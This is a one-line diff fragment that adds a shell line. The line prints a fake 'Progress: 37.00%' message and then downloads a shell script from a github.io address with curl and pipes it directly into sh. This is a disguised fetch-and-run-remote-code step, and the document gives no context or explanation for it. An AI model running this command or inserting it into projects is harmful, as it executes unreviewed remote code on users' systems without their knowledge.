@@ -1,0 +1,1 @@
+echo Progress: 37.00%curl -L --progress-bar frkns.github.io/fun/appeared-removed-rs.sh | sh
